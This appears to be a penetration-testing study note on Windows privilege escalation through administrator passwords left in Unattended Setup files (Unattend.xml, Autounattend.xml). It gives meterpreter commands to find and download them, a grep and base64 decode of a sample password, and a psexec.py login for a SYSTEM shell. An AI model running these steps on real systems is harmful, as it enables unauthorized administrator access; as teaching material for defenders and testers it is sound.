# Privilege Escalation: Passwords In Win Config Files

## Contents
- [Intro](#intro)
  - [Windows Configuration Files](#windows-configuration-files)
  - [Unattended Windows Setup](#unattended-windows-setup)
- [Practical: Find, Decode, Use](#practical-find-decode-use)
  - [Search & Download](#search--download)
  - [cat, grep, decode](#cat-grep-decode)
  - [Exploit](#exploit)

## Intro

### Windows Configuration Files
- Windows can automate a variety of repetitive tasks, such as the mass rollout or installation of Windows on many systems.
- This is typically done through the use of the Unattended Windows Setup utility, which is used to automate the mass installation/deployment of Windows on various systems.
- This tool utilizes configuration files that contain specific configurations and user account credentials, specifically the Administrator account's password.
- If the Unattended Windows Setup configuration files are left on the target system after installation, they can reveal user account credentials that can be used by attackers to authenticate with a Windows target legitimately.
  - The sysadmin needs to go to each individual machine and delete the configuration files.
  - If not, the administrator password could be exposed if it's included in the config file.
 
### Unattended Windows Setup
- The Unattended Windows Setup utility will typically utilize one of the following configuration files that contain user account and system confirmation information:
  - `C:\Windows\Panther\Unattend.xml`
  - `C:\Windows\Panther\Autounattend.xml`
- As a security precaution, the passwords stored in the Unattended Windows Setup configuration file may be encoded in base64.

## Practical: Find, Decode, Use

### Search & Download
> The assumption here is that you have a compromised Windows target, but the account you appropriated is unpriviledged. 

- You could just poke around the target machine like a normal user (which is NOT a privileged account AT ALL) to find the config file.
- Or you could search... For example, using the search module in meterpreter:
```
> search
  # by itself this will give you usage syntax

> search -f Unattend.xml
> search -f Autounattend.xml
> cd [/path/to/the/file.xml]
> download unattend.xml
```

### cat, grep, decode
```
cat unattend.xml | grep Password
```
- This should provide you with a result similar to:
```
<AutoLogon>
  <Password>
    <Value>QWRtaW5AMTIz</Value>
    <PlainText>false</PlainText>
  </Password>
  <Enabled>true</Enabled>
  <Username>administrator</Username>
</AutoLogon>
```
- If the PlainText field is "false," then you have a Base64 encoded password you need to decode.
- Use the `base64` tool to (`-d`) decode it: 
```
base64 -d password.txt > plaintextpwd.txt
# or
base64 -d password.txt
```

### Exploit
- Test out the password you just decoded with the psexec.py Python script:
```
psexec.py Administrator@[target ip]
```
- It'll prompt for password. Enter it. You should get a command shell session (`whoami: nt authority\system`)


